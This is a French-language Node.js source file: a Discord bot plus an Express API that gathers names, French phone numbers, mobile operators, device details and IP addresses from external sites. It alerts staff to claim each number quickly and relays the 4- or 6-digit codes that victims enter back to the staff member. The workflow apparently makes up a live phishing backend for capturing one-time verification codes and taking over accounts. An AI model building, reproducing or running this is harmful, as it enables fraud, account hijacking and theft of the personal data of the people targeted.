const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, PermissionsBitField, ChannelType, StringSelectMenuBuilder, SlashCommandBuilder, REST, Routes, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const express = require('express');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');

const DISCORD_TOKEN    = process.env.DISCORD_TOKEN    || 'TON_TOKEN_ICI';
const CLIENT_ID        = process.env.CLIENT_ID        || 'TON_CLIENT_ID_ICI'; 
const ADMIN_CHANNEL_ID = process.env.ADMIN_CHANNEL_ID || '1570890792745304245';

const ROLE_CROWN_ID    = '1541601494929907763';
const ROLE_OWNER_ID    = '1565080966693781644';
const ROLE_SUPPORT_ID  = '1541600641183387738';

const demandes = new Map();

const client = new Client({ intents: [
  GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages,
  GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers
]});

client.once('ready', async () => {
  console.log(`✅ Bot connecté : ${client.user.tag}`);
  
  const commands = [
    new SlashCommandBuilder().setName('ticket').setDescription('Envoyer le panneau de ticket').addChannelOption(o => o.setName('salon').setDescription('Salon').setRequired(true)),
    new SlashCommandBuilder().setName('list').setDescription('Afficher la liste des demandes')
  ].map(c => c.toJSON());

  const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
  try { await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands }); } catch (e) { console.error(e); }
});

client.on('interactionCreate', async (interaction) => {
  // --- MENU TICKET ---
  if (interaction.isStringSelectMenu() && interaction.customId === 'ticket_select') {
    const choice = interaction.values[0];
    let cat = choice === 'acces' ? 'Get-Acces' : (choice === 'redeem' ? 'Redeem' : 'Autre');
    await interaction.reply({ content: `⏳ Création du ticket...`, ephemeral: true });
    try {
      const thread = await interaction.channel.threads.create({ name: `🎫 ${cat} - ${interaction.user.username}`, type: ChannelType.PrivateThread });
      await thread.members.add(interaction.user.id);
      const embed = new EmbedBuilder().setTitle(`🎫 Ticket : ${cat}`).setDescription(`> Bonjour ${interaction.user}, un membre du staff va te répondre.`).setColor(0x2b2d31);
      const btn = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('close_ticket').setLabel('Fermer le ticket').setStyle(ButtonStyle.Danger).setEmoji('🔒'));
      await thread.send({ content: `<@&${ROLE_CROWN_ID}> <@&${ROLE_OWNER_ID}> <@&${ROLE_SUPPORT_ID}>`, embeds: [embed], components: [btn] });
    } catch (e) { await interaction.followUp({ content: "❌ Impossible de créer le ticket.", ephemeral: true }); }
    return;
  }
  
  if (interaction.isButton() && interaction.customId === 'close_ticket') {
    await interaction.reply({ content: 'Fermeture dans 5s...' });
    setTimeout(() => { if (interaction.channel) interaction.channel.delete().catch(() => {}); }, 5000);
    return;
  }

  // --- BOUTONS DU SITE ---
  if (!interaction.isButton()) return;
  const args = interaction.customId.split(':');
  const action = args[0];
  const demandeId = args[args.length - 1]; 
  const demande = demandes.get(demandeId);
  if (!demande) return interaction.reply({ content: 'Ce dossier est terminé ou n\'existe plus.', ephemeral: true });

  // PRENDRE LE NUMÉRO
  if (action === 'claim') {
    if (demande.claimed) return interaction.reply({ content: '❌ Déjà pris !', ephemeral: true });
    demande.claimed = true;
    demande.claimedBy = interaction.user.id;
    demandes.set(demandeId, demande);

    const embedPris = new EmbedBuilder()
      .setTitle(`⚡ NOUVELLE DEMANDE : ${demande.operator}`)
      .setColor(0xFF6B00)
      .setDescription(`**Pris par ${interaction.user}**\n\n1️⃣ **Pseudo :** \`${demande.username}\`\n2️⃣ **Appareil :** \`${demande.device}\`\n3️⃣ **IP :** \`${demande.ip}\`\n4️⃣ **Opérateur :** \`${demande.operator}\`\n5️⃣ **Numéro :** \`${demande.phone}\``);

    await interaction.update({ embeds: [embedPris], components: [] });

    const thread = await interaction.channel.threads.create({ name: `📁 Dossier - ${demande.username}`, type: ChannelType.PrivateThread });
    await thread.members.add(interaction.user.id);
    demande.threadId = thread.id;
    demandes.set(demandeId, demande);

    const dossierEmbed = new EmbedBuilder()
      .setTitle('📁 FICHE DE VÉRIFICATION')
      .setColor(0x2b2d31)
      .addFields(
        { name: '1️⃣ Pseudo', value: `\`\`\`\n${demande.username}\n\`\`\``, inline: false },
        { name: '2️⃣ Appareil', value: `\`${demande.device}\``, inline: true },
        { name: '3️⃣ IP', value: `\`${demande.ip}\``, inline: true },
        { name: '4️⃣ Opérateur', value: `\`${demande.operator}\``, inline: true },
        { name: '5️⃣ Numéro', value: `\`\`\`\n+33 ${demande.phone}\n\`\`\``, inline: false }
      );

    const rowCode = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`setcode:4:${demandeId}`).setLabel('Code 4 Chiffres').setStyle(ButtonStyle.Success).setEmoji('📱'),
      new ButtonBuilder().setCustomId(`setcode:6:${demandeId}`).setLabel('Code 6 Chiffres').setStyle(ButtonStyle.Primary).setEmoji('🔢')
    );
    const rowActions = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`copynum:${demandeId}`).setLabel('Copier Numéro').setStyle(ButtonStyle.Secondary).setEmoji('📋'),
      new ButtonBuilder().setCustomId(`reject:${demandeId}`).setLabel('Rejeter').setStyle(ButtonStyle.Danger).setEmoji('❌')
    );

    await thread.send({ content: `${interaction.user}, voici ton dossier :`, embeds: [dossierEmbed], components: [rowCode, rowActions] });
    return interaction.followUp({ content: `✅ Dossier déplacé : ${thread}`, ephemeral: true });
  }

  // COPIER LE NUMÉRO
  if (action === 'copynum') return interaction.reply({ content: `\`${demande.phone}\``, ephemeral: true });

  // DEMANDER LE CODE
  if (action === 'setcode') {
    const length = parseInt(args[1]);
    demande.codeLength = length;
    demande.waitingForCode = true;
    demandes.set(demandeId, demande);
    await interaction.update({ content: `⏳ **En attente du code à ${length} chiffres...**`, embeds: [], components: [] });
  }

  // MAUVAIS CODE
  if (action === 'badcode') {
    demande.waitingForCode = true;
    demandes.set(demandeId, demande);
    await interaction.update({ content: `⚠️ **Code invalide. Le client a été invité à réessayer.**`, embeds: [], components: [] });
  }

  // VALIDER
  if (action === 'accept') {
    demande.status = 'accepted';
    demandes.set(demandeId, demande);
    await interaction.update({ content: `✅ **Validé !**`, embeds: [], components: [] });
    setTimeout(() => { if (interaction.channel) interaction.channel.delete().catch(() => {}); }, 5000);
  }

  // REJETER (Ouvre une fenêtre pour écrire le message)
  if (action === 'reject') {
    const modal = new ModalBuilder().setCustomId(`reject_modal:${demandeId}`).setTitle('Raison du rejet');
    const input = new TextInputBuilder().setCustomId('reason').setLabel('Message pour le client').setStyle(TextInputStyle.Paragraph).setPlaceholder('Ex: Faux numéro, numéro déjà utilisé...').setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(input));
    await interaction.showModal(modal);
  }
});

// GESTION DU MESSAGE DE REJET (MODAL)
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isModalSubmit()) return;
  if (interaction.customId.startsWith('reject_modal:')) {
    const demandeId = interaction.customId.split(':')[1];
    const raison = interaction.fields.getTextInputValue('reason');
    const demande = demandes.get(demandeId);
    
    if (demande) {
      demande.status = 'rejected';
      demande.rejectReason = raison;
      demandes.set(demandeId, demande);
    }
    
    await interaction.reply({ content: `❌ **Dossier rejeté.**\nRaison envoyée au client : *${raison}*`, ephemeral: true });
    setTimeout(() => { if (interaction.channel) interaction.channel.delete().catch(() => {}); }, 5000);
  }
});

// COMMANDES SLASH
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;
  if (interaction.commandName === 'ticket') {
    const channel = interaction.options.getChannel('salon');
    const embed = new EmbedBuilder().setTitle("🎟️ Besoin d'aide ?").setDescription("> *Ouvrez un ticket en sélectionnant une catégorie ci-dessous.*").setColor(0x2b2d31).setImage('https://i.imgur.com/NhoPWn6.png');
    const menu = new ActionRowBuilder().addComponents(new StringSelectMenuBuilder().setCustomId('ticket_select').setPlaceholder('Sélectionne une catégorie...').addOptions([{ label: 'Get-Acces', value: 'acces', emoji: '🔑' },{ label: 'Redeem', value: 'redeem', emoji: '💎' },{ label: 'Autre', value: 'autre', emoji: '❓' }]));
    await channel.send({ embeds: [embed], components: [menu] });
    return interaction.reply({ content: `✅ Envoyé.`, ephemeral: true });
  }
  if (interaction.commandName === 'list') {
    const all = Array.from(demandes.values());
    const embed = new EmbedBuilder().setTitle('📂 Demandes').setColor(0x2b2d31).addFields(
      { name: `⏳ En attente (${all.filter(d=>d.status==='pending'||d.waitingForCode).length})`, value: all.filter(d=>d.status==='pending'||d.waitingForCode).map(d => `> ${d.username} (${d.operator})`).join('\n') || '`Aucun`' },
      { name: `✅ Acceptées (${all.filter(d=>d.status==='accepted').length})`, value: all.filter(d=>d.status==='accepted').map(d => `> ${d.username} | Code: ${d.code}`).join('\n') || '`Aucun`' }
    );
    return interaction.reply({ embeds: [embed], ephemeral: true });
  }
});

// API POUR LES SITES
const app = express();
app.use(cors());
app.use(express.json());

app.post('/api/demande', async (req, res) => {
  try {
    const { username, phone, operator, device, ip } = req.body;
    const id = uuidv4();
    let formattedPhone = phone;
    if(phone.length === 10) formattedPhone = `${phone.slice(0,2)} ${phone.slice(2,4)} ${phone.slice(4,6)} ${phone.slice(6,8)} ${phone.slice(8,10)}`;

    const demande = { id, username, phone: formattedPhone, operator, device: device || 'Inconnu', ip: ip || 'Inconnue', status: 'pending', claimed: false, waitingForCode: false };
    demandes.set(id, demande);

    const channel = await client.channels.fetch(ADMIN_CHANNEL_ID).catch(() => null);
    
    // TEXTE PUBLIC
    const embedPublic = new EmbedBuilder()
      .setTitle(`⚡ NOUVELLE DEMANDE`)
      .setDescription(`Clique sur **Prendre le numéro**, fais vite !! 🚀`)
      .setColor(0xFF6B00);
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`claim:${id}`).setLabel('Prendre le numéro').setStyle(ButtonStyle.Primary).setEmoji('⚡')
    );

    const msg = await channel.send({ content: `@everyone`, embeds: [embedPublic], components: [row] });
    demande.publicMsgId = msg.id;
    demandes.set(id, demande);

    res.json({ success: true, demandeId: id });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/demande/:id/status', (req, res) => {
  const demande = demandes.get(req.params.id);
  if (!demande) return res.status(404).json({ error: 'Introuvable' });
  res.json({ status: demande.status, waitingForCode: demande.waitingForCode, codeLength: demande.codeLength || 4, rejectReason: demande.rejectReason || null });
});

app.post('/api/demande/:id/code', async (req, res) => {
  try {
    const { code } = req.body;
    const demande = demandes.get(req.params.id);
    demande.waitingForCode = false;
    demande.code = code;
    demandes.set(demande.id, demande);

    const embedCode = new EmbedBuilder().setTitle('🔑 CODE REÇU').setColor(0x2b2d31)
      .addFields({ name: 'Code', value: `# **${code}**`, inline: false });
    const rowActions = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`accept:${demande.id}`).setLabel('Valider & Activer').setStyle(ButtonStyle.Success).setEmoji('✅'),
      new ButtonBuilder().setCustomId(`badcode:${demande.id}`).setLabel('Mauvais Code').setStyle(ButtonStyle.Danger).setEmoji('⚠️')
    );
    if (demande.threadId) {
      const thread = await client.channels.fetch(demande.threadId).catch(() => null);
      if (thread) await thread.send({ content: `<@${demande.claimedBy}>`, embeds: [embedCode], components: [rowActions] });
    }
    res.json({ success: true });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🌐 API sur port ${PORT}`));
client.login(DISCORD_TOKEN);